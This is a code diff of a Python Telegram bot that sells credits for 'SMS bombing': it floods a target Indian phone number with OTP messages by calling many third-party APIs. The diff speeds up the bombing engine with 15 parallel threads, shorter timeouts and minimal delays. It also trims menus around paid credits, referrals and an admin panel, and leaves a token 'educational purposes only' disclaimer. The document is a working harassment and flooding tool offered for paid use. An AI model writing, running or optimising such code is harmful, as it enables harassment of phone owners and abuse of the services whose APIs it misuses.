@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # (c) @lordzenox | @zenoxtool | @ghostpyo
 
-import os, sys, json, time, threading, random, logging, requests
+import os, sys, json, time, threading, random, logging, requests, concurrent.futures
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
@@ -30,7 +30,7 @@ def load_services():
 SERVICES = load_services()
 print(f"✅ Loaded {len(SERVICES)} services")
 
-# ---------- BOMBING ENGINE ----------
+# ---------- BOMBING ENGINE (SPEED OPTIMIZED) ----------
 def format_phone(phone, fmt):
     p = str(phone).strip()
     if fmt == "with_plus91":
@@ -58,11 +58,11 @@ def send_request(svc, phone):
     
     try:
         if method == 'GET':
-            r = requests.get(url, headers=headers, timeout=5)
+            r = requests.get(url, headers=headers, timeout=3)
         elif method == 'POST':
-            r = requests.post(url, headers=headers, json=data, timeout=5)
+            r = requests.post(url, headers=headers, json=data, timeout=3)
         elif method == 'PUT':
-            r = requests.put(url, headers=headers, json=data, timeout=5)
+            r = requests.put(url, headers=headers, json=data, timeout=3)
         else:
             return False
         return r.status_code < 500
@@ -79,22 +79,34 @@ def bomb_thread(phone, total, user_id):
     success = 0
     failed = 0
     
+    def send_one(svc):
+        try:
+            return send_request(svc, phone)
+        except:
+            return False
+    
     while sent < total and not stop_bombing.get(user_id, False):
-        for svc in services:
-            if stop_bombing.get(user_id, False) or sent >= total:
-                break
-            try:
-                ok = send_request(svc, phone)
+        # 15 APIs ek saath parallel mein
+        batch_size = 15
+        batch = services[:batch_size]
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
+            results = executor.map(send_one, batch)
+            for ok in results:
+                if stop_bombing.get(user_id, False) or sent >= total:
+                    break
                 if ok:
                     success += 1
                 else:
                     failed += 1
                 sent += 1
                 total_requests[user_id] = sent
-                time.sleep(0.05)
-            except:
-                failed += 1
-                sent += 1
+                if sent >= total:
+                    break
+        
+        # Shuffle for next batch
+        random.shuffle(services)
+        time.sleep(0.01)  # Minimal delay
     
     add_bomb_stats(user_id, phone, sent, success, failed)
     return sent, success, failed
@@ -149,11 +161,10 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode="Markdown")
 
-# ---------- START COMMAND ----------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await main_menu(update, context)
 
-# ---------- MESSAGE HANDLER FOR NUMBER INPUT ----------
+# ---------- MESSAGE HANDLER ----------
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
@@ -172,7 +183,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         coins = get_balance(user_id)
         if coins < BOMB_COST:
-            await update.message.reply_text(f"❌ Insufficient credits!\n💰 Balance: {coins}\n💸 Cost: {BOMB_COST}\n\n💳 Buy credits from the menu.")
+            await update.message.reply_text(f"❌ Insufficient credits!\n💰 Balance: {coins}\n💸 Cost: {BOMB_COST}")
             return
         
         if not deduct_coins(user_id, BOMB_COST, f"Bomb on +91{target}"):
@@ -210,7 +221,6 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     user_id = update.effective_user.id
-    user = update.effective_user
     
     if is_banned(user_id):
         await query.edit_message_text("🚫 You are banned.")
@@ -218,7 +228,6 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     data = query.data
     
-    # ---------- SEND SMS ----------
     if data == "send_sms":
         await query.edit_message_text(
             "📱 **Enter Target Number**\n\n"
@@ -229,22 +238,15 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         context.user_data['waiting_for'] = 'bomb_number'
     
-    # ---------- VIDEOS ----------
     elif data == "videos":
         await query.edit_message_text(
             f"📹 **Video Tutorials**\n\n"
-            f"🎥 How to use {BOT_NAME}:\n"
-            f"1. Click SEND SMS\n"
-            f"2. Enter target number\n"
-            f"3. Wait for results\n\n"
-            f"📢 More videos on channel:\n"
-            f"{CHANNEL1}",
+            f"📢 More videos on channel:\n{CHANNEL1}",
             parse_mode="Markdown"
         )
         keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
         await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))
     
-    # ---------- CREDITS ----------
     elif data == "credits":
         coins = get_balance(user_id)
         stats = get_user_stats(user_id)
@@ -256,9 +258,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 💣 **Bombs Used:** {stats['total_bombs']}
 📱 **SMS Sent:** {stats['total_sms']}
 👤 **Referrals:** {ref_count}
-🎁 **Bonus Earned:** {ref_count * REFERRAL_BONUS}
-
-💡 Earn more credits by referring friends!"""
+🎁 **Bonus Earned:** {ref_count * REFERRAL_BONUS}"""
         
         keyboard = [
             [InlineKeyboardButton("🔗 Refer & Earn", callback_data="refer")],
@@ -267,20 +267,6 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
     
-    # ---------- REDEEM ----------
-    elif data == "redeem":
-        await query.edit_message_text(
-            "🎁 **Redeem Code**\n\n"
-            "Enter your redeem code to get free credits.\n\n"
-            "Format: `/redeem <code>`\n\n"
-            "Example: `/redeem XBOMBER2024`\n\n"
-            "💡 Get redeem codes from our channel!",
-            parse_mode="Markdown"
-        )
-        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
-        await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))
-    
-    # ---------- REFER ----------
     elif data == "refer":
         ref_code = get_referral_code(user_id)
         if not ref_code:
@@ -297,18 +283,14 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 `{ref_link}`
 
 📊 **Total Referrals:** {ref_count}
-💰 **Coins Earned:** {ref_count * REFERRAL_BONUS}
-
-🔥 Share this link with your friends!
-They get **{FREE_COINS} FREE coins** and you get **{REFERRAL_BONUS} coins**!"""
+💰 **Coins Earned:** {ref_count * REFERRAL_BONUS}"""
         
         keyboard = [
-            [InlineKeyboardButton("📤 Share", url=f"https://t.me/share/url?url={ref_link}&text=🔥 Join {BOT_NAME}! Get free credits!")],
+            [InlineKeyboardButton("📤 Share", url=f"https://t.me/share/url?url={ref_link}&text=🔥 Join {BOT_NAME}!")],
             [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
         ]
         await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
     
-    # ---------- STATS ----------
     elif data == "stats":
         stats = get_user_stats(user_id)
         coins = get_balance(user_id)
@@ -320,20 +302,15 @@ They get **{FREE_COINS} FREE coins** and you get **{REFERRAL_BONUS} coins**!"""
 💣 **Total Bombs:** {stats['total_bombs']}
 📱 **SMS Sent:** {stats['total_sms']}
 📡 **APIs:** {len(SERVICES)}
-👤 **Referrals:** {get_referral_count(user_id)}
-📅 **Joined:** {get_user(user_id)[7][:10] if get_user(user_id) else 'N/A'}"""
+👤 **Referrals:** {get_referral_count(user_id)}"""
         
         keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
         await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
     
-    # ---------- HISTORY ----------
     elif data == "history":
         logs = get_bomb_logs(user_id)
         if not logs:
-            await query.edit_message_text(
-                "📜 **No SMS History**\n\nYou haven't sent any SMS yet.\n\n💀 Press SEND SMS to start!",
-                parse_mode="Markdown"
-            )
+            await query.edit_message_text("📜 **No SMS History**")
             keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
             await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))
             return
@@ -341,34 +318,22 @@ They get **{FREE_COINS} FREE coins** and you get **{REFERRAL_BONUS} coins**!"""
         msg = "📜 **My SMS History**\n\n"
         for target, sms, success, failed, date in logs[:5]:
             date_short = date[:16]
-            msg += f"📱 +91{target}\n   📊 {sms} SMS | ✅ {success} | ❌ {failed}\n   🕐 {date_short}\n\n"
-        
-        if len(logs) > 5:
-            msg += f"\n... and {len(logs)-5} more"
+            msg += f"📱 +91{target}\n   📊 {sms} SMS | ✅ {success}\n   🕐 {date_short}\n\n"
         
         keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
         await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
     
-    # ---------- BUY CREDITS ----------
     elif data == "buy_credits":
         msg = f"""💳 **Buy Credits**
 
-Contact the owner to purchase credits:
-
 👤 **Owner:** {OWNER}
 
-💎 **Credit Prices:**
+💎 **Prices:**
 • 50 credits - ₹10
 • 100 credits - ₹20
 • 250 credits - ₹45
 • 500 credits - ₹80
-• 1000 credits - ₹150
-• 5000 credits - ₹700
-
-📩 **Payment Methods:**
-UPI, GPay, PhonePe, Paytm
-
-Click below to contact owner!"""
+• 1000 credits - ₹150"""
         
         keyboard = [
             [InlineKeyboardButton("👤 Contact Owner", url="https://t.me/lordzenox")],
@@ -376,20 +341,15 @@ Click below to contact owner!"""
         ]
         await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
     
-    # ---------- TRANSFER CREDITS ----------
     elif data == "transfer":
         await query.edit_message_text(
             "🔄 **Transfer Credits**\n\n"
-            "Send credits to another user.\n\n"
-            "Format: `/transfer <user_id> <amount>`\n\n"
-            "Example: `/transfer 123456789 10`\n\n"
-            "⚠️ Minimum transfer: 1 credit",
+            "Usage: `/transfer <user_id> <amount>`",
             parse_mode="Markdown"
         )
         keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
         await query.edit_message_reply_markup(InlineKeyboardMarkup(keyboard))
     
-    # ---------- INFO ----------
     elif data == "info":
         msg = f"""ℹ️ **About {BOT_NAME}**
 
@@ -398,24 +358,12 @@ Click below to contact owner!"""
 📡 **APIs:** {len(SERVICES)}
 📢 **Channel:** {CHANNEL1}
 
-**Features:**
-• {len(SERVICES)}+ Firebase APIs
-• Multi-threaded bombing
-• Credit system
-• Referral program
-• SMS history
-• Admin panel
-
-**⚠️ Disclaimer:**
-For educational purposes only.
-Misuse is prohibited.
-
-**📞 Support:** {OWNER}"""
+⚠️ **Disclaimer:**
+For educational purposes only."""
         
         keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_main")]]
         await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
     
-    # ---------- BACK TO MAIN ----------
     elif data == "back_main":
         await main_menu_callback(query, user_id)
 
@@ -423,7 +371,6 @@ async def main_menu_callback(query, user_id):
     user = get_user(user_id)
     stats = get_user_stats(user_id)
     coins = get_balance(user_id)
-    ref_count = get_referral_count(user_id)
     
     if not user:
         await query.edit_message_text("❌ Please use /start")
@@ -460,209 +407,164 @@ async def main_menu_callback(query, user_id):
     
     await query.edit_message_text(msg, reply_markup=reply_markup, parse_mode="Markdown")
 
-# ---------- STOP COMMAND ----------
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     stop_bombing[user_id] = True
     await update.message.reply_text("🛑 **Bombing Stopped!**", parse_mode="Markdown")
 
-# ---------- REDEEM COMMAND ----------
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
     if is_banned(user_id):
         await update.message.reply_text("🚫 You are banned.")
         return
-    
     if len(context.args) != 1:
         await update.message.reply_text("❌ Usage: `/redeem <code>`", parse_mode="Markdown")
         return
-    
     code = context.args[0]
     success, msg = use_redeem_code(user_id, code)
     await update.message.reply_text(msg, parse_mode="Markdown")
 
-# ---------- TRANSFER COMMAND ----------
 async def transfer(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
     if is_banned(user_id):
         await update.message.reply_text("🚫 You are banned.")
         return
-    
     if len(context.args) != 2:
         await update.message.reply_text("❌ Usage: `/transfer <user_id> <amount>`", parse_mode="Markdown")
         return
-    
     try:
         target_id = int(context.args[0])
         amount = int(context.args[1])
     except ValueError:
         await update.message.reply_text("❌ Invalid input!")
         return
-    
     success, msg = transfer_coins(user_id, target_id, amount)
     await update.message.reply_text(msg, parse_mode="Markdown")
 
 # ---------- ADMIN COMMANDS ----------
 async def admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
     if user_id != ADMIN_ID:
         await update.message.reply_text("❌ Unauthorized!")
         return
-    
     stats = get_total_stats()
-    
-    msg = f"""🔐 **Admin Panel - {BOT_NAME}**
+    msg = f"""🔐 **Admin Panel**
 
-📊 **Bot Stats:**
-• Users: {stats['users']}
-• Credits: {stats['coins']}
-• Bombs: {stats['bombs']}
-• SMS: {stats['sms']}
-• Admins: {stats['admins']}
-• Banned: {stats['banned']}
-• APIs: {len(SERVICES)}
+📊 Users: {stats['users']}
+💰 Credits: {stats['coins']}
+💣 Bombs: {stats['bombs']}
+📱 SMS: {stats['sms']}
+📡 APIs: {len(SERVICES)}
 
-🔧 **Commands:**
 /addcoins <id> <amount>
 /broadcast <msg>
 /ban <id>
 /unban <id>
 /statsall
 /createcode <code> <amount>"""
-    
     await update.message.reply_text(msg, parse_mode="Markdown")
 
 async def addcoins(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
     if user_id != ADMIN_ID:
         await update.message.reply_text("❌ Unauthorized!")
         return
-    
     if len(context.args) != 2:
         await update.message.reply_text("❌ Usage: `/addcoins <user_id> <amount>`", parse_mode="Markdown")
         return
-    
     try:
         target_id = int(context.args[0])
         amount = int(context.args[1])
     except ValueError:
         await update.message.reply_text("❌ Invalid input!")
         return
-    
     add_coins(target_id, amount, f"Admin added {amount} credits")
     await update.message.reply_text(f"✅ Added **{amount}** credits to `{target_id}`", parse_mode="Markdown")
 
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
     if user_id != ADMIN_ID:
         await update.message.reply_text("❌ Unauthorized!")
         return
-    
     if not context.args:
         await update.message.reply_text("❌ Usage: `/broadcast <message>`", parse_mode="Markdown")
         return
-    
     message = " ".join(context.args)
     users = get_all_users()
-    
     sent = 0
     for uid, username, coins, bombs, sms in users:
         try:
-            await context.bot.send_message(uid, f"📢 **Announcement**\n\n{message}\n\n- {OWNER}", parse_mode="Markdown")
+            await context.bot.send_message(uid, f"📢 **Announcement**\n\n{message}", parse_mode="Markdown")
             sent += 1
             time.sleep(0.05)
         except:
             pass
-    
     await update.message.reply_text(f"✅ Broadcast sent to {sent} users")
 
 async def statsall(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
     if user_id != ADMIN_ID:
         await update.message.reply_text("❌ Unauthorized!")
         return
-    
     stats = get_total_stats()
-    msg = f"""📊 **{BOT_NAME} - Full Statistics**
+    msg = f"""📊 **Full Statistics**
 
 👤 Users: {stats['users']}
 💰 Credits: {stats['coins']}
 💣 Bombs: {stats['bombs']}
 📱 SMS: {stats['sms']}
-👑 Admins: {stats['admins']}
-🚫 Banned: {stats['banned']}
 📡 APIs: {len(SERVICES)}
-
 👑 Owner: {OWNER}"""
-    
     await update.message.reply_text(msg, parse_mode="Markdown")
 
 async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
     if user_id != ADMIN_ID:
         await update.message.reply_text("❌ Unauthorized!")
         return
-    
     if len(context.args) != 1:
         await update.message.reply_text("❌ Usage: `/ban <user_id>`", parse_mode="Markdown")
         return
-    
     try:
         target_id = int(context.args[0])
     except ValueError:
         await update.message.reply_text("❌ Invalid user_id!")
         return
-    
     ban_user(target_id)
     await update.message.reply_text(f"🚫 User `{target_id}` banned.", parse_mode="Markdown")
 
 async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
     if user_id != ADMIN_ID:
         await update.message.reply_text("❌ Unauthorized!")
         return
-    
     if len(context.args) != 1:
         await update.message.reply_text("❌ Usage: `/unban <user_id>`", parse_mode="Markdown")
         return
-    
     try:
         target_id = int(context.args[0])
     except ValueError:
         await update.message.reply_text("❌ Invalid user_id!")
         return
-    
     unban_user(target_id)
     await update.message.reply_text(f"✅ User `{target_id}` unbanned.", parse_mode="Markdown")
 
 async def createcode(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
     if user_id != ADMIN_ID:
         await update.message.reply_text("❌ Unauthorized!")
         return
-    
     if len(context.args) != 2:
         await update.message.reply_text("❌ Usage: `/createcode <code> <amount>`", parse_mode="Markdown")
         return
-    
     code = context.args[0]
     try:
         amount = int(context.args[1])
     except ValueError:
         await update.message.reply_text("❌ Invalid amount!")
         return
-    
     create_redeem_code(code, amount, user_id)
-    await update.message.reply_text(f"✅ Redeem code `{code}` created for {amount} credits!", parse_mode="Markdown")
+    await update.message.reply_text(f"✅ Redeem code `{code}` created!", parse_mode="Markdown")
 
 # ---------- MAIN ----------
 def main():
@@ -670,13 +572,11 @@ def main():
     
     app = Application.builder().token(BOT_TOKEN).build()
     
-    # User commands
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stop", stop))
     app.add_handler(CommandHandler("redeem", redeem))
     app.add_handler(CommandHandler("transfer", transfer))
     
-    # Admin commands
     app.add_handler(CommandHandler("admin", admin))
     app.add_handler(CommandHandler("addcoins", addcoins))
     app.add_handler(CommandHandler("broadcast", broadcast))
@@ -685,12 +585,11 @@ def main():
     app.add_handler(CommandHandler("unban", unban))
     app.add_handler(CommandHandler("createcode", createcode))
     
-    # Callback & Message handlers (FIXED)
     app.add_handler(CallbackQueryHandler(callback_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
     print("=" * 50)
-    print(f"🤖 {BOT_NAME}")
+    print(f"🤖 {BOT_NAME} (SPEED OPTIMIZED)")
     print(f"📊 Loaded {len(SERVICES)} APIs")
     print(f"👑 Owner: {OWNER}")
     print("=" * 50)
